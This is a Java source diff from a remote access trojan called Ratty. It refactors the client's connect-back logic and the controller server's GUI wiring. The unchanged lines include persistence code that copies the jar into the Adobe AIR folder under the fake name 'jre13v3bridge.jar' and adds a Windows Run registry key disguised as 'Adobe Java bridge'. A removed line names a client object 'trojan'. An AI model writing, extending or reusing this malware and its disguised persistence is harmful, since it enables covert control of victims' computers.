@@ -13,6 +13,7 @@ import javax.swing.plaf.nimbus.NimbusLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.server.ActiveServer;
+import de.sogomn.rat.server.gui.RattyGui;
 import de.sogomn.rat.server.gui.RattyGuiController;
 
 /*
@@ -31,7 +32,7 @@ public final class Ratty {
 	private static boolean client;
 	
 	private static final int CONNECTION_INTERVAL = 5000;
-	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
+	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
 	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	
@@ -101,10 +102,9 @@ public final class Ratty {
 	}
 	
 	public static void connectToHost(final String address, final int port) {
-		final ActiveConnection newClient = new ActiveConnection(address, port);
-		final Client trojan = new Client();
+		final ActiveConnection connection = new ActiveConnection(address, port);
 		
-		if (!newClient.isOpen()) {
+		if (!connection.isOpen()) {
 			try {
 				Thread.sleep(CONNECTION_INTERVAL);
 			} catch (final Exception ex) {
@@ -117,14 +117,18 @@ public final class Ratty {
 			return;
 		}
 		
-		newClient.setObserver(trojan);
-		newClient.start();
+		final Client client = new Client(connection);
+		
+		connection.setObserver(client);
+		connection.start();
 	}
 	
 	public static void startServer(final int port) {
 		final ActiveServer server = new ActiveServer(port);
-		final RattyGuiController controller = new RattyGuiController();
+		final RattyGui gui = new RattyGui();
+		final RattyGuiController controller = new RattyGuiController(server, gui);
 		
+		gui.addListener(controller);
 		server.setObserver(controller);
 		server.start();
 	}
